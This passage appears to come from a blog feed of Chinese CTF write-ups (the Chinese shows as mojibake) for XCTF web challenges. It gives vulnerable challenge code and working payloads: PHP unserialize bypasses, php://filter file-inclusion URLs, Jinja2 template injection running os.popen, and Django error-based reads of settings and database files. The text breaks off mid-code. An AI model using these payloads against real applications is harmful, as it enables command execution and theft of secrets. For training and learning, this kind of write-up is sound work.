<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">arsa=RSA.generate(1024)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p-1)*(arsa.q-1))</span><br><span class="line">i=1</span><br><span class="line">while(True):</span><br><span class="line">    x=(Fn*i)+1</span><br><span class="line">    if(x%arsa.e==0):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           break</span><br><span class="line">    i=i+1</span><br><span class="line">private=open(&#x27;private.pem&#x27;,&#x27;w&#x27;)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆç§é’¥</p>
<p>åœ¨kaliç»ˆç«¯è¾“å…¥opensslè¿›å…¥openssl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -in flag.enc(å¯†æ–‡åç§°) -inkey private.pem(æˆ‘ä»¬æ‰€æ±‚å¾—å¯†é’¥åç§°)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œweb</title>
    <url>/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
    <content><![CDATA[<p>  æ”»é˜²ä¸–ç•Œweb</p>
   <span id="more"></span>

<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p><code>__wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªç»•è¿‡ç‚¹ã€‚</code></p>
<p>O:7:â€chybetaâ€:1:{s:4:â€testâ€;s:3:â€123â€;}</p>
<p>è¿™é‡Œçš„Oå‘¢å°±æ˜¯objectå¯¹è±¡çš„æ„æ€</p>
<p>æ•°å­—7ä»£è¡¨ç€å¯¹è±¡çš„å‡½æ•°åæœ‰7ä¸ªå ä½</p>
<p>ç„¶åå°±æ˜¯å¯¹è±¡åäº†</p>
<p>è¿™ä¸ªæ•°å­—1è¡¨ç¤ºå¯¹è±¡é‡Œæœ‰ä¸€ä¸ªå˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p><code>__wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªç»•è¿‡ç‚¹ã€‚</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new xctf();</span><br><span class="line">print(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>run ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>æ›´æ”¹å±æ€§è·³è¿‡__wake</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>cyberpeace{80472bc9cb95f5a442c6b980d0a2f2ed}</p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><code>@</code>æ˜¯å¯ä»¥å±è”½å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜è€Œäº§ç”Ÿçš„ä¸€äº›é”™è¯¯ã€è­¦å‘Šä¿¡æ¯ï¼Œè¿™æ ·ç”¨æˆ·å°±çœ‹ä¸åˆ°ç¨‹åºçš„å‡ºé”™ä¿¡æ¯ã€‚è¿™æ ·é™¤äº†ç”¨æˆ·ç•Œé¢ä¼šå‹å¥½ä¸€äº›å¤–ï¼Œæ›´é‡è¦çš„æ˜¯å®‰å…¨æ€§ï¼Œå› ä¸ºå±è”½äº†å‡ºé”™æ–‡ä»¶çš„è·¯å¾„ç­‰ä¿¡æ¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//\dåŒ¹é…æ•°å­—ï¼Œoc:+4ç»•è¿‡</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$c</span>); <span class="comment">//åå¤æµ‹è¯•ä¸èƒ½æ‰‹åŠ¨æ”¹ï¼Œç”±äºååºåˆ—åŒ–åå‡ºç°ä¹±ç ï¼Œå¤åˆ¶ä¹‹åä¼šæ”¹å˜å¯¼è‡´åºåˆ—åŒ–ç»“æœä¸ä¸€æ ·ï¼Œåªèƒ½ç”±str_replaceæ›¿æ¢ï¼Œå¦åˆ™base64ç¼–ç ä¸ä¸€æ ·ã€‚æ— æ³•çˆ†å‡ºç»“æœã€‚æ‰¾äº†20åˆ†é’Ÿçš„åŸå› ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>

<p>ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}</p>
<h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $file1 = $_GET[&quot;file1&quot;];</span><br><span class="line">    $file2 = $_GET[&quot;file2&quot;];</span><br><span class="line">    if(!empty($file1) &amp;&amp; !empty($file2))</span><br><span class="line">    &#123;</span><br><span class="line">        if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;NONONO&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63403/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶hackbarä¼ å‚hello ctf</p>
<p>cyberpeace{e0487d7ed7e17a96dea9922a9a1d19a2}</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...å†æƒ³æƒ³&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_51683653/article/details/128839648">https://blog.csdn.net/m0_51683653/article/details/128839648</a></p>
<p>cyberpeace{e8b0e794a7cc1f5d75bae6b3868d77db}</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);   <span class="comment">//å­—ç¬¦ä¸²åè½¬</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>; <span class="comment">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//chr() å‡½æ•°ä»æŒ‡å®š ASCII å€¼è¿”å›å­—ç¬¦ã€‚å¹¶å¯ä»¥æŒ‡å®šASCIIæ˜¯åè¿›åˆ¶æˆ–æ˜¯åå…­è¿›åˆ¶æˆ–æ˜¯å…«è¿›åˆ¶ã€‚</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// â€œ.â€ æ˜¯å­—ç¬¦è¿ç®—ç¬¦ï¼Œä½œç”¨æ˜¯æŠŠä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œ</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*str_rot13() å‡½æ•°å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚</span></span><br><span class="line"><span class="comment">ROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â€‹      substr()</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>å¿…éœ€ã€‚è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚</th>
</tr>
</thead>
<tbody><tr>
<td><em>start</em></td>
<td>å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æŒ‡å®šä½ç½®å¼€å§‹0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</td>
</tr>
<tr>
<td><em>length</em></td>
<td>å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» <em>start</em> å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›çš„é•¿åº¦è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›çš„é•¿åº¦</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=NULL;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;    </span><br><span class="line">        $_c=substr($_,$_0,1);  </span><br><span class="line">        $__=ord($_c)-1;  </span><br><span class="line">        $_c=chr($__);  </span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">echo strrev($_o);//å…ˆåè½¬ï¼Œæ‰€ä»¥è§£å¯†æœ€ååè½¬</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>åƒæ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œä½†éƒ½æ— æœï¼Œä¼ å…¥çš„å€¼è¢«urlç¼–ç ï¼Œ%80ï¼Œä¼ å…¥çœ‹åˆ°æŠ¥é”™å†…å®¹</p>
<p><img src="/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/QQ%E6%88%AA%E5%9B%BE20230612105121.png"></p>
<p>å¯ä»¥çœ‹åˆ°å½“å‰è·¯å¾„ï¼Œpythonæ¡†æ¶Django</p>
<p>å¯ä»¥é€šè¿‡åœ¨@ æ¥è¯»å–æ–‡ä»¶ã€‚å½“ä¸”ä»…å½“æ–‡ä»¶ä¸­å­˜åœ¨ä¸­æ–‡å­—ç¬¦çš„æ—¶å€™ï¼Œ<a href="https://so.csdn.net/so/search?q=Django&spm=1001.2101.3001.7020">Django</a> æ‰ä¼šæŠ¥é”™å¯¼è‡´è·å–æ–‡ä»¶å†…å®¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@/opt/api/api/settings.py</span><br><span class="line">@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>

<h2 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h2><p>æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( !ini_get(&#x27;display_errors&#x27;) ) &#123;</span><br><span class="line">  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$lan = $_COOKIE[&#x27;language&#x27;];</span><br><span class="line">if(!$lan)</span><br><span class="line">&#123;</span><br><span class="line">	@setcookie(&quot;language&quot;,&quot;english&quot;);</span><br><span class="line">	@include(&quot;english.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	@include($lan.&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$x=file_get_contents(&#x27;index.php&#x27;);</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœcookie å­˜åœ¨åˆ™æ–‡ä»¶åŒ…å«</p>
<p>è¿™é‡Œä¼ªåè®®è¯»å–å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>æŸ¥çœ‹æºç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) //å°†ï¼ˆï¼‰æ›¿æ¢ä¸ºç©º</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easyphp-1"><a href="#easyphp-1" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;</span><br><span class="line">    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123;</span><br><span class="line">        $key1 = 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Emmm...å†æƒ³æƒ³&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    die(&quot;Emmm...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);</span><br><span class="line">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;</span><br><span class="line">    